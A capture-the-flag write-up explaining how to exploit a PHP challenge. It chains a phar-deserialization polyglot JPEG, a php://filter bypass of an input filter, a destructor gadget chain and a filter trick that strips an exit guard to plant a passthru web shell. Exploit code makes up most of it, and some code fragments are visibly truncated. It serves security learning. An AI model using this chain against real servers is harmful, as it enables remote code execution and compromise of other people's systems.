TLDR: To complete this task you need to demonstrate phar deserialization and
filter data corruption

You are given deployed html/php files  and ip to the server.

Some of the important files / dir  
```  
/html  
	- index.php (Read uploaded file)  
	- old.php (We will use this as deserialization target)  
	- upload.php (Upload file)  
	- up/ (Uploaded files are placed here)  
```

Before creating our malicious phar payload we need to check if we could
trigger it.  
We could trigger phar deserialization by using `phar://` wrapper on file
manipulation function.  
Eg.  
- `file_exists('phar://phar.phar') or  file_exists('phar://phar.jpeg')`  
- `file_get_contents('phar://phar.phar') or file_get_contents('phar://phar.jpeg')`  
- other functions like `filesize`, `filemtime`, `is_readable`, etc would also work

```  
Index.php

...  
if (isset($_GET["img"])) {  
    if(preg_match('/^(ftp|zlib|https?|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_GET['img'])){  
        die("no hack !");}

$img=$_GET["img"].'.jpg';  
$a='data:image/png;base64,' . base64_encode(file_get_contents($img));  
echo "![]($a)";  
```

As shown in the code, preg_match stops program execution if  `phar://` wrapper
exists in the beginning of the string. And  since preg allow us to use
`php://` wrapper, we could trigger phar deserilization by using
`php://filter/resource=phar://phar.jpeg`

After we know that phar deserilization is triggerable, we need to craft our
payload. Because `upload.php` checks image size, we need to craft phar payload
as jpeg file.

So first we need to create phar with jpeg header in it  
```  
phar_create.php  
startBuffering();  
$phar->addFromString("test.txt","test");  
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");  
$phar->stopBuffering();  
```

Run the above code will give you `phar.phar` as jpeg image with 10x10 size.

Our main goal is able to arbitrarily write php code in `up/` folder.

```  
old.php  
key = $key;  
        $this->store = $store;  
        $this->expire = $expire;  
    }

    public function cleanContents(array $contents) {  
        $cachedProperties = array_flip([  
            'path', 'dirname', 'basename', 'extension', 'filename',  
            'size', 'mimetype', 'visibility', 'timestamp', 'type',  
        ]);

        foreach ($contents as $path => $object) {  
            if (is_array($object)) {  
                $contents[$path] = array_intersect_key($object, $cachedProperties);  
            }  
        }

        return $contents;  
    }

    public function getForStorage() {  
        $cleaned = $this->cleanContents($this->cache);

        return json_encode([$cleaned, $this->complete]);  
    }

    public function save() {  
        $contents = $this->getForStorage();

        $this->store->set($this->key, $contents, $this->expire);  
    }

    public function __destruct() {  
        if (!$this->autosave) {  
            $this->save();  
        }  
    }  
}  
  
class cl2 {

    protected function getExpireTime($expire): int {  
        return (int) $expire;  
    }

    public function getCacheKey(string $name): string {  
        return $this->options['prefix'] . $name;  
    }

    protected function serialize($data): string {  
        if (is_numeric($data)) {  
            return (string) $data;  
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);  
    }

    public function set($name, $value, $expire = null): bool{  
        $this->writeTimes++;

        if (is_null($expire)) {  
            $expire = $this->options['expire'];  
        }

        $expire = $this->getExpireTime($expire);  
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {  
            try {  
                mkdir($dir, 0755, true);  
            } catch (\Exception $e) {

            }  
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {

            $data = gzcompress($data, 3);  
        }

        $data = "\n" . $data;  
        $result = file_put_contents($filename, $data);  
				 if ($result) {  
            return true;  
        }

        return false;  
    }

}  
```

the only code that allow us to write arbitrary code is by calling `set`
function in `cl2` class.

But how could we create cl2 class and call `set` function while nothing such
as `set` function is mentioned in any source codes?  
Well the answer is we could call create cl1 and cl2 class and call its
function by using phar deserilization.

```  
phar_create.php  
startBuffering();  
$phar->addFromString("test.txt","test");  
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");  
$cl2 = new cl2();  
$cl1 = new cl1("aaa", "bbb");  
$phar->setMetadata($cl1);  
$phar->stopBuffering();  
```

By creating cl1 function and set it as metadata. `cl1` class will be created
and `__destruct` function will be called when
`php://filter/resource=phar://phar.jpeg` is called.

phar deserialization could not only able to call `__destruct` and `__wakeup`
functions, but also inject `private`,`protected`, `public` variable inside
class.

By using this tricks, we could configure cl1 class to call `set` function in
`cl2` class  
```  
phar_create.php  
startBuffering();  
$phar->addFromString("test.txt","test");  
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");  
$cl2 = new cl2();  
$cl2->writeTimes = 0;  
$cl2->options = [  
    "data_compress" => false,  
    "prefix" => "",  
    "serialize" => "strval",  
    "expire" => 111111111111  
];

$cl1 = new cl1($cl2, "bbb.php"); // our RCE php file  
$cl1->store = $cl2;  
$cl1->key = "bbb.php";  
$cl1->autosave = false;  
$cl1->cache = [  
    ""  
];  
$cl1->complete = 1;

$phar->setMetadata($cl1);  
$phar->stopBuffering();

```

The above code will called `file_put_contents('bbb.php', PAYLOAD)` so that RCE
could be executed.

Even if  we could inject any code we want,  a stopper written before writing
our payload.  
```  
old.php  
....  
        $data = "\n" . $data;  
        $result = file_put_contents($filename, $data);  
				 if ($result) {  
            return true;  
        }  
...  
```

So when we call `http://url/up/bbb.php` the php will be kinda like  
```

```

So it is impossible to call our php code without removing the exit stopper.

We could delete the stopper code by using PHP filter. (PHP filter is awesome
:D)  
More about this see this presentation
`https://www.ptsecurity.com/upload/corporate/ru-
ru/webinars/ics/%D0%90.%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B8%D0%BD_%D0%9E_%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF_%D0%B8%D1%81%D0%BF_%D0%A0%D0%9D%D0%A0_wrappers.pdf`  
```  
";  
$content = "\n";  
$content .= json_encode([[$c], 1]);  
var_dump($content);  
$file = 'php://filter/write=string.strip_tags|convert.quoted-printable-
decode/resource=./output;  
file_put_contents($file, $content);  
```  
When this code is executed, it will remove the exit function.

We could include this code in our phar_create.php and this is our final code

```  
phar_create.php  
startBuffering();  
$phar->addFromString("test.txt","test");  
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");  
$cl2 = new cl2();  
$cl2->writeTimes = 0;  
$cl2->options = [  
    "data_compress" => false,  
    "prefix" => "",  
    "serialize" => "strval",  
    "expire" => 111111111111  
];

$cl1 = new cl1($cl2, "php://filter/write=string.strip_tags|convert.quoted-
printable-decode/resource=/var/www/html/up/bbb.php");  
$cl1->store = $cl2;  
$cl1->key = "php://filter/write=string.strip_tags|convert.quoted-printable-
decode/resource=/var/www/html/up/bbb.php";  
$cl1->autosave = false;  
$cl1->cache = [  
    "=3C=3Fphp passthru(\$_GET['cmd']); ?>"  
];  
$cl1->complete = 1;

$phar->setMetadata($cl1);  
$phar->stopBuffering();  
```

Rename the `phar.phar` to `phar.jpeg`, upload it and execute phar code in
index.php with `php://filter/resource=phar://IMAGE_ID`.  
After that execute shell by going to `http://URL/up/bbb.php?cmd=ls`.  
The flag could be found on the `/` directory